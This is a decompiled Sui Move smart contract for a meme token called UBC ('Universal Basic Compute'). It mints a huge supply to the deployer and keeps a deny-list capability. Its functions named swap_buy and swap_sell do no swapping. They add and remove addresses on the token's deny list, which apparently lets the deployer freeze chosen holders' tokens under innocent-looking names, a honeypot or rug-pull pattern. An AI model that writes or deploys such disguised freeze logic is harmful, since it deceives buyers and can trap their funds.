module 0x5f24a049326ecdb98f4c2e3a177bbee689db5dc1ae8a5d1370ce592f50c600e4::ubc {
    struct UBC has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: UBC, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<UBC>(arg0, 9, b"UBC", b"Universal Basic Compute", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmUSRAHe5gmTnZQFVQHmeR1TtP91S3dydvFCFdPz9bd5pa"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<UBC>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<UBC>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<UBC>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<UBC>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<UBC>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<UBC>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<UBC>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<UBC>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

